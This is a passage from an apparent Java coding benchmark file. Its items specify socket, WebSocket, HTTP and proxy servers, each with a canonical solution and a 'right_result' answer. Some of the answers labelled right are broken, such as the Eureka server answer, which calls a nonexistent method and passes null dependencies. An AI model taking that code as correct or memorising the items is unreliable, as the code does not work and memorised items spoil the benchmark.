generateHandshakeResponse(key);\n            out.print(response);\n            out.flush();\n\n            sendBinaryFrame(outputStream, \"Hello from WebSocket Server\".getBytes(), false);\n\n            clientSocket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private String getKeyFromRequest(String request) {\n        String[] lines = request.split(\"\\r\\n\");\n        for (String line : lines) {\n            if (line.startsWith(\"Sec-WebSocket-Key:\")) {\n                return line.substring(19).trim();\n            }\n        }\n        return null;\n    }\n\n    private String generateHandshakeResponse(String key) {\n        String guid = \"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\";\n        String hashInput = key + guid;\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"SHA-1\");\n            byte[] sha1Hash = md.digest(hashInput.getBytes(\"UTF-8\"));\n            return \"HTTP/1.1 101 Switching Protocols\\r\\n\" +\n                   \"Upgrade: websocket\\r\\n\" +\n                   \"Connection: Upgrade\\r\\n\" +\n                   \"Sec-WebSocket-Accept: \" + Base64.getEncoder().encodeToString(sha1Hash) + \"\\r\\n\\r\\n\";\n        } catch (Exception e) {\n            e.printStackTrace();\n            return \"\";\n        }\n    }\n\n    private void sendBinaryFrame(OutputStream outputStream, byte[] payload, boolean mask) throws IOException {\n        int length = payload.length;\n        ByteBuffer frame = ByteBuffer.allocate(length + 2 + (mask ? 4 : 0));\n        frame.put((byte) 0x82); // FIN + Opcode binary\n\n        if (length <= 125) {\n            frame.put((byte) (mask ? (length | 0x80) : length));\n        } else if (length <= 65535) {\n            frame.put((byte) (mask ? (126 | 0x80) : 126));\n            frame.putShort((short) length);\n        } else {\n            frame.put((byte) (mask ? (127 | 0x80) : 127));\n            long len = Integer.toUnsignedLong(length);\n            frame.putLong(len);\n        }\n\n        if (mask) {\n            byte[] maskingKey = new byte[4];\n            new Random().nextBytes(maskingKey);\n            frame.put(maskingKey);\n            for (int i = 0; i < length; i++) {\n                payload[i] ^= maskingKey[i % 4];\n            }\n        }\n\n        frame.put(payload);\n        outputStream.write(frame.array());\n        outputStream.flush();\n    }\n\n    public void stop() {\n        try {\n            if (serverSocket != null && !serverSocket.isClosed()) {\n                serverSocket.close();\n                System.out.println(\"WebSocket server stopped.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 533,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using ServerSocket to handle client connections, process incoming requests, and send responses. The server should integrate with Eureka service discovery and manage its lifecycle through initialization and cleanup.\n\nClass Description: ExampleServiceBase is a singleton class that acts as a TCP server, listening on a specified port for client connections. It processes incoming requests by reading input from clients and sending back responses with a timestamp. The class integrates with Eureka service discovery to register its availability.\n\nAttributes:\n- applicationInfoManager: [ApplicationInfoManager] - Manages the service instance information for Eureka registration\n- eurekaClient: [EurekaClient] - Handles communication with the Eureka service discovery server\n\nMethods:\n- ExampleServiceBase([ApplicationInfoManager, EurekaClient]) -> [void] - Constructor that initializes the Eureka-related dependencies\n- start() -> [void] - Initializes the service by setting its status to UP in Eureka and starts listening for client connections on the registered port\n- processRequest([Socket]) -> [void] - Processes an incoming client connection by reading the request, generating a response with current timestamp, and sending it back to the client",
    "Canonical_solution": "import com.netflix.appinfo.ApplicationInfoManager;\nimport com.netflix.appinfo.InstanceInfo;\nimport com.netflix.discovery.EurekaClient;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Date;\n\n@Singleton\npublic class ExampleServiceBase {\n\n    private final ApplicationInfoManager applicationInfoManager;\n    private final EurekaClient eurekaClient;\n\n    @Inject\n    public ExampleServiceBase(ApplicationInfoManager applicationInfoManager,\n                            EurekaClient eurekaClient) {\n        this.applicationInfoManager = applicationInfoManager;\n        this.eurekaClient = eurekaClient;\n    }\n\n    @PostConstruct\n    public void start() {\n        applicationInfoManager.setInstanceStatus(InstanceInfo.InstanceStatus.UP);\n        \n        try {\n            int myServingPort = applicationInfoManager.getInfo().getPort();\n            ServerSocket serverSocket = new ServerSocket(myServingPort);\n            final Socket s = serverSocket.accept();\n            processRequest(s);\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processRequest(final Socket s) {\n        try {\n            BufferedReader rd = new BufferedReader(new InputStreamReader(s.getInputStream()));\n            String line = rd.readLine();\n            if (line != null) {\n                System.out.println(\"Received a request from the example client: \" + line);\n            }\n            String response = \"BAR \" + new Date();\n            System.out.println(\"Sending the response to the client: \" + response);\n\n            PrintStream out = new PrintStream(s.getOutputStream());\n            out.println(response);\n\n        } catch (Throwable e) {\n            System.err.println(\"Error processing requests\");\n        } finally {\n            if (s != null) {\n                try {\n                    s.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport com.netflix.appinfo.ApplicationInfoManager;\nimport com.netflix.appinfo.InstanceInfo;\nimport com.netflix.discovery.EurekaClient;\nimport java.io.*;\nimport java.net.*;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\n\npublic class ExampleServiceBase {\n    private final ApplicationInfoManager applicationInfoManager;\n    private final EurekaClient eurekaClient;\n    private ServerSocket serverSocket;\n    private int port;\n\n    private static class SingletonHelper {\n        private static final ExampleServiceBase INSTANCE = new ExampleServiceBase(\n                null, null);\n    }\n\n    public static ExampleServiceBase getInstance() {\n        return SingletonHelper.INSTANCE;\n    }\n\n    private ExampleServiceBase(ApplicationInfoManager applicationInfoManager,\n                               EurekaClient eurekaClient) {\n        this.applicationInfoManager = applicationInfoManager;\n        this.eurekaClient = eurekaClient;\n        this.port = Integer.parseInt(applicationInfoManager.getInfo().getPort().toStringWithoutPort());\n    }\n\n    public void start() throws IOException {\n        applicationInfoManager.setInstanceStatus(InstanceInfo.InstanceStatus.UP);\n        serverSocket = new ServerSocket(port);\n        System.out.println(\"Server started on port \" + port);\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(() -> processRequest(clientSocket)).start();\n        }\n    }\n\n    private void processRequest(Socket socket) {\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n             PrintWriter out = new PrintWriter(socket.getOutputStream(), true)) {\n\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                String response = \"Received: \" + inputLine + \" at \" + getCurrentTimestamp();\n                out.println(response);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private String getCurrentTimestamp() {\n        SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n        return sdf.format(new Date());\n    }\n}\n```"
  },
  {
    "Task_id": 534,
    "Instruction": "Task Description: Implement a WebSocket handshake server in Java that handles various test cases for WebSocket connection upgrades. The server should listen on a specified port, accept client connections, and respond with different HTTP responses based on the requested test case.\n\nClass Description: WebSocketHandshakeServer is a TCP server that simulates WebSocket handshake responses for testing purposes. It creates a ServerSocket to listen for incoming connections and handles each client connection in a separate thread, responding with different HTTP responses based on the requested test case path.\n\nAttributes:\n- serverSocket: ServerSocket - The server socket that listens for incoming client connections\n- port: int - The port number on which the server listens for connections\n- additionalHandshake: String - Constant string containing additional handshake headers required for WebSocket upgrade\n\nMethods:\n- WebSocketHandshakeServer(int port) -> None - Constructor that initializes the server with the specified port number\n- start() -> void - Starts the server, creates a ServerSocket, and begins accepting client connections in a new thread\n- stop() -> void - Stops the server by closing the ServerSocket if it's open\n- handleClientConnection(Socket client) -> void - Handles an individual client connection, reads the request, and sends the appropriate response based on the test case\n- asciiBytes(String input) -> byte[] - Helper method that converts a string to ASCII bytes for network transmission",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Scanner;\n\npublic class WebSocketHandshakeServer {\n\n    private static final String additionalHandshake = \"Upgrade: websocket\\r\\nConnection: Upgrade\\r\\n\\r\\n\";\n    private ServerSocket serverSocket;\n    private int port;\n\n    public WebSocketHandshakeServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        serverSocket = new ServerSocket(port);\n        serverSocket.setReuseAddress(true);\n        \n        new Thread(() -> {\n            while (!serverSocket.isClosed()) {\n                try {\n                    Socket client = serverSocket.accept();\n                    handleClientConnection(client);\n                } catch (IOException e) {\n                    if (!serverSocket.isClosed()) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }).start();\n    }\n\n    private void handleClientConnection(Socket client) throws IOException {\n        try (Scanner in = new Scanner(client.getInputStream());\n             OutputStream os = client.getOutputStream()) {\n            \n            String input = in.nextLine();\n            String testCase = input.split(\" \")[1];\n            \n            switch (testCase) {\n                case \"/0\":\n                    os.write(asciiBytes(\"HTTP/1.1 100 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/1\":\n                    os.write(asciiBytes(\"HTTP/1.0 100 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/2\":\n                    os.write(asciiBytes(\"HTTP 100 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/3\":\n                    os.write(asciiBytes(\"HTTP/1.1 200 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/4\":\n                    os.write(asciiBytes(\"HTTP 101 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/5\":\n                    os.write(asciiBytes(\"HTTP/1.1 404 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/6\":\n                    os.write(asciiBytes(\"HTTP/2.0 404 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/7\":\n                    os.write(asciiBytes(\"HTTP/1.1 500 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/8\":\n                    os.write(asciiBytes(\"GET 302 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/9\":\n                    os.write(asciiBytes(\"GET HTTP/1.1 101 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/10\":\n                    os.write(asciiBytes(\"HTTP/1.1 101 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/11\":\n                    os.write(asciiBytes(\"HTTP/1.1 101 Websocket Connection Upgrade\\r\\n\" + additionalHandshake));\n                    break;\n            }\n            os.flush();\n        } finally {\n            client.close();\n        }\n    }\n\n    public void stop() throws IOException {\n        if (serverSocket != null && !serverSocket.isClosed()) {\n            serverSocket.close();\n        }\n    }\n\n    private byte[] asciiBytes(String input) {\n        return input.getBytes(java.nio.charset.StandardCharsets.US_ASCII);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.nio.charset.StandardCharsets;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.*;\n\npublic class WebSocketHandshakeServer {\n    private ServerSocket serverSocket;\n    private final int port;\n    private static final String ADDITIONAL_HANDSHAKE = \"Upgrade: websocket\\r\\nConnection: Upgrade\\r\\nSec-WebSocket-Accept: \";\n\n    public WebSocketHandshakeServer(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        new Thread(() -> {\n            try {\n                serverSocket = new ServerSocket(port);\n                System.out.println(\"WebSocketHandshakeServer started on port \" + port);\n                while (!serverSocket.isClosed()) {\n                    Socket client = serverSocket.accept();\n                    new Thread(() -> handleClientConnection(client)).start();\n                }\n            } catch (IOException e) {\n                if (!serverSocket.isClosed()) {\n                    e.printStackTrace();\n                }\n            }\n        }).start();\n    }\n\n    public void stop() {\n        try {\n            if (serverSocket != null && !serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleClientConnection(Socket client) {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));\n             OutputStream output = client.getOutputStream()) {\n\n            StringBuilder requestBuilder = new StringBuilder();\n            String line;\n            while (!(line = reader.readLine()).isEmpty()) {\n                requestBuilder.append(line).append(\"\\r\\n\");\n            }\n\n            String requestLine = requestLine(requestBuilder.toString());\n            if (requestLine == null || !requestLine.startsWith(\"GET \")) {\n                sendHttpResponse(output, 400, \"Bad Request\", \"Invalid request line.\");\n                return;\n            }\n\n            String path = getPath(requestLine);\n            if (\"/success\".equals(path)) {\n                handleSuccessCase(output, requestBuilder.toString());\n            } else if (\"/missingupgrade\".equals(path)) {\n                sendHttpResponse(output, 400, \"Bad Request\", \"Missing Upgrade header.\");\n            } else if (\"/wrongupgrade\".equals(path)) {\n                sendHttpResponse(output, 400, \"Bad Request\", \"Wrong Upgrade value.\");\n            } else if (\"/badkey\".equals(path)) {\n                sendHttpResponse(output, 400, \"Bad Request\", \"Invalid Sec-WebSocket-Key.\");\n            } else {\n                sendHttpResponse(output, 404, \"Not Found\", \"Test case not found.\");\n            }\n\n        } catch (IOException | NoSuchAlgorithmException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                client.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private byte[] asciiBytes(String input) {\n        return input.getBytes(StandardCharsets.US_ASCII);\n    }\n\n    private String requestLine(String request) {\n        int firstCRLF = request.indexOf(\"\\r\\n\");\n        if (firstCRLF == -1) return null;\n        return request.substring(0, firstCRLF);\n    }\n\n    private String getPath(String requestLine) {\n        int space1 = requestLine.indexOf(' ');\n        int space2 = requestLine.indexOf(' ', space1 + 1);\n        if (space1 == -1 || space2 == -1) return null;\n        return requestLine.substring(space1 + 1, space2);\n    }\n\n    private void handleSuccessCase(OutputStream output, String request) throws IOException, NoSuchAlgorithmException {\n        Map<String, String> headers = parseHeaders(request);\n        String secWebSocketKey = headers.get(\"Sec-WebSocket-Key\");\n\n        if (secWebSocketKey == null) {\n            sendHttpResponse(output, 400, \"Bad Request\", \"Missing Sec-WebSocket-Key.\");\n            return;\n        }\n\n        String guid = \"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\";\n        String keyWithGuid = secWebSocketKey + guid;\n        MessageDigest sha1 = MessageDigest.getInstance(\"SHA-1\");\n        byte[] hash = sha1.digest(keyWithGuid.getBytes(StandardCharsets.ISO_8859_1));\n        Base64.Encoder encoder = Base64.getEncoder();\n        String accept = ADDITIONAL_HANDSHAKE + encoder.encodeToString(hash) + \"\\r\\n\\r\\n\";\n\n        output.write(asciiBytes(\"HTTP/1.1 101 Switching Protocols\\r\\n\"));\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            if (\"Sec-WebSocket-Key\".equalsIgnoreCase(entry.getKey())) continue;\n            output.write(asciiBytes(entry.getKey() + \": \" + entry.getValue() + \"\\r\\n\"));\n        }\n        output.write(asciiBytes(accept));\n        output.flush();\n    }\n\n    private Map<String, String> parseHeaders(String request) {\n        Map<String, String> headers = new HashMap<>();\n        String[] lines = request.split(\"\\r\\n\");\n        for (int i = 1; i < lines.length; i++) {\n            String line = lines[i];\n            int colonIndex = line.indexOf(':');\n            if (colonIndex > 0) {\n                String key = line.substring(0, colonIndex).trim();\n                String value = line.substring(colonIndex + 1).trim();\n                headers.put(key, value);\n            }\n        }\n        return headers;\n    }\n\n    private void sendHttpResponse(OutputStream output, int code, String status, String body) throws IOException {\n        String response = \"HTTP/1.1 \" + code + \" \" + status + \"\\r\\n\" +\n                \"Content-Type: text/plain\\r\\n\" +\n                \"Content-Length: \" + body.length() + \"\\r\\n\" +\n                \"\\r\\n\" +\n                body;\n        output.write(asciiBytes(response));\n        output.flush();\n    }\n}\n```"
  },
  {
    "Task_id": 537,
    "Instruction": "Task Description: Implement a simple HTTP server class that listens for incoming client connections on a dynamically assigned port and responds with a \"Not Implemented\" HTTP status. The server should be able to handle basic client requests and clean up resources properly when closed.\n\nClass Description: The HTTPServer class implements a basic HTTP server using Java's ServerSocket. It runs in a separate thread to handle incoming connections and responds with a fixed HTTP 501 response. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- server: [ServerSocket] - The underlying ServerSocket instance that listens for incoming connections\n- thread: [Thread] - The thread in which the server runs to handle client connections asynchronously\n\nMethods:\n- HTTPServer() throws [IOException] -> [void] - Constructor that initializes the ServerSocket on a random available port and starts the server thread\n- port() -> [int] - Returns the local port number on which the server is listening\n- serve() -> [void] - Private method that handles incoming client connections and sends HTTP responses (runs in the server thread)\n- close() throws [Exception] -> [void] - Closes the server socket and waits for the server thread to terminate (implements AutoCloseable)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.nio.charset.StandardCharsets;\n\npublic class HTTPServer implements AutoCloseable {\n    private final ServerSocket server;\n    private final Thread thread;\n\n    public HTTPServer() throws IOException {\n        server = new ServerSocket(0, 1);\n        thread = new Thread(new Runnable() {\n            @Override public void run() {\n                serve();\n            }\n        });\n        thread.start();\n    }\n\n    public final int port() {\n        return server.getLocalPort();\n    }\n\n    private void serve() {\n        try {\n            Socket client = server.accept();\n\n            try (InputStream inputStream = client.getInputStream()) {\n                while (inputStream.available() > 0) {\n                    if (inputStream.read() == -1) {\n                        break;\n                    }\n                }\n\n                try (OutputStream outputStream = client.getOutputStream()) {\n                    outputStream.write(\"HTTP/1.0 501 Not Implemented\\r\\n\\r\\n\".getBytes(StandardCharsets.UTF_8));\n                }\n            }\n        }\n        catch (IOException e) {\n            if (server.isClosed() && e instanceof SocketException) {\n                return;\n            }\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override public void close() throws Exception {\n        server.close();\n        thread.join();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class HTTPServer implements AutoCloseable {\n    private final ServerSocket server;\n    private final Thread thread;\n\n    public HTTPServer() throws IOException {\n        server = new ServerSocket(0);\n        thread = new Thread(this::serve);\n        thread.start();\n    }\n\n    public int port() {\n        return server.getLocalPort();\n    }\n\n    private void serve() {\n        try {\n            while (!server.isClosed()) {\n                Socket client = server.accept();\n                String response = \"HTTP/1.1 501 Not Implemented\\r\\nContent-Length: 0\\r\\n\\r\\n\";\n                byte[] buffer = response.getBytes();\n                client.getOutputStream().write(buffer);\n                client.close();\n            }\n        } catch (IOException e) {\n            if (!server.isClosed()) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    @Override\n    public void close() throws Exception {\n        server.close();\n        thread.join();\n    }\n}\n```"
  },
  {
    "Task_id": 538,
    "Instruction": "Task Description: Create a TCP server class that handles multiple client connections concurrently, processes incoming requests, and sends responses back to clients.\n\nClass Description: The ViewServer class implements a multi-threaded TCP server that listens on a specified port, accepts client connections, and processes client requests using a thread pool. Each client connection is handled by a separate worker thread.\n\nAttributes:\n- VIEW_SERVER_MAX_CONNECTIONS: [int] - Maximum number of concurrent client connections allowed\n- mServer: [ServerSocket] - Server socket instance for accepting client connections\n- mPort: [int] - Port number on which the server listens\n- mThread: [Thread] - Main server thread\n- mThreadPool: [ExecutorService] - Thread pool for handling client connections\n\nMethods:\n- ViewServer([int port]) -> [void] - Constructor that initializes the server with the specified port\n- start() -> [boolean] - Starts the server thread and thread pool, returns true if successful\n- run() -> [void] - Main server loop that accepts client connections and delegates to worker threads\n- writeValue([Socket client, String value]) -> [boolean] - Helper method to write a response to a client socket\n- ViewServerWorker([Socket client]) -> [void] - Nested class constructor for handling individual client connections\n- run() -> [void] - Worker thread method that processes client requests and sends responses",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class ViewServer implements Runnable {\n    private static final int VIEW_SERVER_MAX_CONNECTIONS = 10;\n    private ServerSocket mServer;\n    private final int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    private ViewServer(int port) {\n        mPort = port;\n    }\n\n    public boolean start() throws IOException {\n        if (mThread != null) {\n            return false;\n        }\n\n        mThread = new Thread(this, \"Local View Server [port=\" + mPort + \"]\");\n        mThreadPool = Executors.newFixedThreadPool(VIEW_SERVER_MAX_CONNECTIONS);\n        mThread.start();\n\n        return true;\n    }\n\n    @Override\n    public void run() {\n        try {\n            mServer = new ServerSocket(mPort, VIEW_SERVER_MAX_CONNECTIONS, InetAddress.getLocalHost());\n        } catch (Exception e) {\n            return;\n        }\n\n        while (mServer != null && Thread.currentThread() == mThread) {\n            try {\n                Socket client = mServer.accept();\n                if (mThreadPool != null) {\n                    mThreadPool.submit(new ViewServerWorker(client));\n                } else {\n                    try {\n                        client.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            } catch (Exception e) {\n                break;\n            }\n        }\n    }\n\n    private static boolean writeValue(Socket client, String value) {\n        boolean result;\n        BufferedWriter out = null;\n        try {\n            OutputStream clientStream = client.getOutputStream();\n            out = new BufferedWriter(new OutputStreamWriter(clientStream), 8 * 1024);\n            out.write(value);\n            out.write(\"\\n\");\n            out.flush();\n            result = true;\n        } catch (Exception e) {\n            result = false;\n        } finally {\n            if (out != null) {\n                try {\n                    out.close();\n                } catch (IOException e) {\n                    result = false;\n                }\n            }\n        }\n        return result;\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private Socket mClient;\n\n        private ViewServerWorker(Socket client) {\n            mClient = client;\n        }\n\n        @Override\n        public void run() {\n            BufferedReader in = null;\n            try {\n                in = new BufferedReader(new InputStreamReader(mClient.getInputStream()), 1024);\n                final String request = in.readLine();\n\n                String command;\n                String parameters;\n\n                int index = request.indexOf(' ');\n                if (index == -1) {\n                    command = request;\n                    parameters = \"\";\n                } else {\n                    command = request.substring(0, index);\n                    parameters = request.substring(index + 1);\n                }\n\n                boolean result = writeValue(mClient, \"RESPONSE\");\n            } catch (IOException e) {\n            } finally {\n                if (in != null) {\n                    try {\n                        in.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n                if (mClient != null) {\n                    try {\n                        mClient.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.*;\n\npublic class ViewServer {\n    public static final int VIEW_SERVER_MAX_CONNECTIONS = 10;\n    private ServerSocket mServer;\n    private int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    public ViewServer(int port) {\n        mPort = port;\n        mThreadPool = Executors.newFixedThreadPool(VIEW_SERVER_MAX_CONNECTIONS);\n    }\n\n    public boolean start() {\n        try {\n            mServer = new ServerSocket(mPort);\n            mThread = new Thread(this::run);\n            mThread.start();\n            return true;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    private void run() {\n        try {\n            while (!mServer.isClosed()) {\n                Socket client = mServer.accept();\n                mThreadPool.execute(new ViewServerWorker(client));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private boolean writeValue(Socket client, String value) {\n        try (OutputStream out = client.getOutputStream();\n             PrintWriter writer = new PrintWriter(out)) {\n            writer.println(value);\n            writer.flush();\n            return true;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private Socket mClient;\n\n        public ViewServerWorker(Socket client) {\n            mClient = client;\n        }\n\n        @Override\n        public void run() {\n            try (InputStream in = mClient.getInputStream();\n                 BufferedReader reader = new BufferedReader(new InputStreamReader(in))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    System.out.println(\"Received: \" + line);\n                    writeValue(mClient, \"Echo: \" + line);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    mClient.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 539,
    "Instruction": "Task Description: Create a TCP proxy server class that can forward traffic between a client and a remote server, with the ability to start, stop, and manage connections.\n\nClass Description: The ConnectionManipulationProxyServer class implements a TCP proxy server that listens on a local port, accepts client connections, and forwards traffic to a specified remote server. It provides thread-safe control over the proxy operation and proper resource cleanup.\n\nAttributes:\n- localPort: [int] - The local port number the proxy listens on\n- host: [String] - The hostname or IP address of the remote server\n- remotePort: [int] - The port number of the remote server\n- proxyThread: [Thread] - The thread running the proxy operation\n- enableLock: [Object] - Synchronization object for thread-safe control\n- enableProxy: [boolean] - Flag indicating whether proxy is enabled\n- running: [boolean] - Flag indicating whether proxy thread should continue running\n- client: [Socket] - Socket for client connection\n- server: [Socket] - Socket for server connection\n- serverSocket: [ServerSocket] - Server socket for accepting client connections\n\nMethods:\n- ConnectionManipulationProxyServer(String host, int remotePort, int localPort) -> [void] - Constructor that initializes the proxy server with target host and ports\n- startProxy() -> [void] - Starts the proxy server thread and enables traffic forwarding\n- stopProxy() -> [void] - Stops the proxy server thread and disables traffic forwarding\n- killOpenSockets() -> [void] - Closes all open sockets and cleans up resources\n- run() -> [void] - Main proxy thread implementation that handles connection forwarding\n- getLocalPort() -> [int] - Returns the local port number the proxy is listening on",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.logging.Logger;\n\npublic class ConnectionManipulationProxyServer implements Runnable {\n    private static final Logger log = Logger.getLogger(ConnectionManipulationProxyServer.class.getName());\n    private int localPort;\n    private String host;\n    private int remotePort;\n    private Thread proxyThread;\n    private final Object enableLock = new Object();\n    private boolean enableProxy = true;\n    private boolean running = true;\n    Socket client = null, server = null;\n    ServerSocket serverSocket = null;\n\n    public ConnectionManipulationProxyServer(String host, int remotePort, int localPort) {\n        this.localPort = localPort;\n        this.remotePort = remotePort;\n        this.host = host;\n        proxyThread = new Thread(this);\n    }\n\n    public void startProxy() {\n        log.info(\"[CMPS Proxy] - Starting Proxy\");\n        synchronized (enableLock) {\n            enableProxy = true;\n        }\n        running = true;\n        proxyThread.start();\n    }\n\n    public void stopProxy() {\n        log.info(\"[CMPS Proxy] - Stopping Proxy\");\n        synchronized (enableLock) {\n            enableProxy = false;\n        }\n        running = false;\n        killOpenSockets();\n    }\n\n    private void killOpenSockets() {\n        log.info(\"[CMPS Proxy] - killOpenSockets Called.\");\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n            if (client != null) {\n                client.close();\n            }\n            if (server != null) {\n                server.close();\n            }\n        } catch (IOException ex) {\n            // Ignore during cleanup\n        }\n    }\n\n    @Override\n    public void run() {\n        log.info(\"[CMPS Proxy] - Proxy Thread running.\");\n        try {\n            final byte[] request = new byte[1024];\n            byte[] reply = new byte[4096];\n            boolean canIrun = true;\n            \n            while (running) {\n                synchronized (enableLock) {\n                    canIrun = enableProxy;\n                }\n                \n                while (canIrun) {\n                    synchronized (enableLock) {\n                        canIrun = enableProxy;\n                        if (!enableProxy) {\n                            break;\n                        }\n                    }\n                    \n                    if (serverSocket == null || serverSocket.isClosed()) {\n                        serverSocket = new ServerSocket(localPort);\n                        localPort = serverSocket.getLocalPort();\n                    }\n                    \n                    log.info(\"[CMPS Proxy] - Waiting for incoming connection..\");\n                    client = serverSocket.accept();\n                    log.info(\"[CMPS Proxy] - Client Opened Connection to Proxy...\");\n                    \n                    final InputStream streamFromClient = client.getInputStream();\n                    final OutputStream streamToClient = client.getOutputStream();\n                    \n                    server = new Socket(host, remotePort);\n                    log.info(\"Proxy: Proxy Connected to Server\");\n                    \n                    final InputStream streamFromServer = server.getInputStream();\n                    final OutputStream streamToServer = server.getOutputStream();\n                    \n                    Thread thread = new Thread() {\n                        public void run() {\n                            int bytesRead;\n                            try {\n                                while ((bytesRead = streamFromClient.read(request)) != -1) {\n                                    streamToServer.write(request, 0, bytesRead);\n                                    streamToServer.flush();\n                                }\n                            } catch (IOException ex) {\n                                log.warning(\"[CMPS Proxy] - IOException in client to server stream: \" + ex.getMessage());\n                                try {\n                                    client.close();\n                                    server.close();\n                                } catch (IOException e) {\n                                    // Ignore during cleanup\n                                }\n                            }\n                        }\n                    };\n                    \n                    thread.start();\n                    \n                    int bytesRead;\n                    try {\n                        while ((bytesRead = streamFromServer.read(reply)) != -1) {\n                            streamToClient.write(reply, 0, bytesRead);\n                            streamToClient.flush();\n                        }\n                    } catch (IOException ex) {\n                        log.warning(\"[CMPS Proxy] - IOException in server to client stream: \" + ex.getMessage());\n                        client.close();\n                        server.close();\n                    }\n                    \n                    streamToClient.close();\n                }\n            }\n            \n            if (!serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n            \n        } catch (IOException ex) {\n            log.warning(\"[CMPS Proxy] - Thread Connection lost: \" + ex.getMessage());\n        }\n    }\n\n    public int getLocalPort() {\n        return localPort;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
